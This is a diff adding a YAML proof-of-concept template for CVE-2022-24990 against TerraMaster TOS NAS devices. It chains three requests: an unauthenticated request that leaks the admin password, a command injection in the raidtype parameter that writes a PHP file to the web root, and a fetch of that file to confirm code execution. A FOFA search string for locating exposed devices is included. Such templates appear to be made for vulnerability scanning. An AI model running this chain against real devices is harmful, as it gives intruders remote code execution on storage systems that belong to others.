@@ -1,0 +1,43 @@
+name: poc-yaml-TerraMaster-TOS-information-disclosure-getshell
+manual: true
+transport: http
+set:
+    r1: randomLowercase(4)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /module/api.php?mobile/webNasIPS
+            headers:
+                User-Agent: TNAS
+        expression: response.status == 200 && response.body.bcontains(b"true") && response.body.bcontains(b"successful")
+        output:
+            search: '"PWD:(?P<pwd>.+?)/".bsubmatch(response.body)'
+            pwd: search["pwd"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /module/api.php?mobile/createRaid
+            headers:
+                Authorization: '{{pwd}}/'
+                Content-Type: application/x-www-form-urlencoded
+                User-Agent: TNAS
+            body: |
+                raidtype=%3Becho+%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3E{{r1}}.php&diskstring=XXXX
+        expression: response.status == 200 && response.body.bcontains(b"true") && response.body.bcontains(b"successful")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /module/{{r1}}.php
+        expression: response.status == 200 && response.body.bcontains(b"PHP Version") && response.body.bcontains(b"Build Date") && response.body.bcontains(b"Directive")
+expression: r0() && r1() && r2()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: \"TerraMaster\"  \&& header=\"TOS\"
+    tips: /module/{{r1}}.php
+    vulninfo: TerraMaster TOS 信息泄漏漏洞 CVE-2022-24990 getshell
